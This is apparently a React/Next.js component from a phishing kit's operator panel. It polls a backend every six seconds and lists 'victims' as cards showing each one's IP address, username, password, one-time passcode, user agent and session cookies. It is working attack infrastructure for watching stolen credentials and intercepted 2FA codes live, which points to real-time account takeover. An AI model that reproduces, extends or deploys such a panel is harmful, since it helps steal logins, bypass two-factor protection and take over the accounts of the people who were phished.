"use client";
import Image from "next/image";
import { Inter } from "next/font/google";
import { Button, ButtonGroup } from "@nextui-org/react";
const inter = Inter({ subsets: ["latin"] });
import VictimCard from "./VictimCard";
import { useState, useEffect } from "react";
import { DNA } from "react-loader-spinner";
import { getCookie } from "cookies-next";

var fdata = "";
try {
  const res = await fetch(`${process.env.API_URL}/users/all`, {
    method: "GET",
    cache: "no-cache",
    headers: {
      "X-API-Key": getCookie("API_KEY"),
    },
  });
  fdata = await res.json();
} catch (error) {}

function Victimlst() {
  // const first_data =  async() =>{
  //  await res.json();
  // }
  const [data, setData] = useState(fdata);
  useEffect(() => {
    const fetchData = async () => {
      try {
        const response = await fetch(`${process.env.API_URL}/users/all`, {
          method: "GET",
          cache: "no-cache",
          headers: {
            "X-API-Key": getCookie("API_KEY"),
          },
        });
        const json = await response.json();
        setData(json);
      } catch (error) {}
    };

    fetchData();

    const intervalId = setInterval(() => {
      fetchData();
    }, 6000);
    return () => clearInterval(intervalId);
  }, []);

  const victims_checker = () => {
    if (data == "") {
      return (
        <div className="flex items-center justify-center flex-col">
          <DNA
            visible={true}
            height="120"
            width="120"
            ariaLabel="dna-loading"
            wrapperStyle={{}}
            wrapperClass="dna-wrapper"
          />
        </div>
      );
    } else {
      return (
        <ul className="flex justify-center flex-wrap">
          {data.map((victim, index) => {
            return (
              <li key={index}>
                <VictimCard
                  id={victim.id}
                  ip={victim.ip}
                  username={victim.username}
                  password={victim.password}
                  action={victim.action}
                  OTP={victim.OTP}
                  user_agent={victim.user_agent}
                  Cookies={victim.Cookies}
                />
              </li>

              // <h1>test</h1>
            );
          })}
        </ul>
      );
    }
  };
  // setCurrOTP(fdata)
  // useEffect( async()=>{
  //   setCurrOTP(fdata)
  // },[fdata])

  return <div className="menu block md:w-auto ">{victims_checker()}</div>;
}

export default Victimlst;
